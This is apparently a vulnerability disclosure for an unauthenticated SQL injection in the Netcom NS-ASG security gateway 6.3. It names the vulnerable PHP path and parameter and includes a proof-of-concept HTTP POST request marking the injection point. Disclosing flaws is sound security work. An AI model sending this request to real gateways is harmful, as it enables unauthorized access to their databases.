Beijing Wangkang Technology Co., Ltd. is a leading provider of network application management equipment in China, focusing on the latest trend research and analysis in the field of network application management. It provides users with advanced network application management technology, products, and solutions, aiming to help users achieve the goal of "using the internet well" in network management.

There is an SQL injection vulnerability in the Netcom NS-ASG application security gateway. Attackers exploit vulnerabilities to cause harm to servers.

official： https://www.netentsec.com/

version:6.3

Vulnerability Path ： /protocol/iscgwtunnel/uploadiscgwrouteconf.php

analyse as below:
Accept the array $GWLinkId through the variable messagecontent, then traverse the $GWLinkId variable and directly substitute it into the sql statement without any verification. Causing unauthorized sql injection


<img width="606" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/32e4a7f7-ca7f-4b3e-b67b-f9ff92ac1565">

Poc：
```
POST /protocol/index.php HTTP/1.1
Host: 127.0.0.1
Cookie: PHPSESSID=bfd2e9f9df564de5860117a93ecd82de
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 73

jsoncontent={"protocolType":"uploadiscgwtunnel","messagecontent":["1*"]}
```
<img width="607" alt="image" src="https://github.com/flyyue2001/cve/assets/88701694/c2750e22-e1c6-45ac-9375-93877752790c">
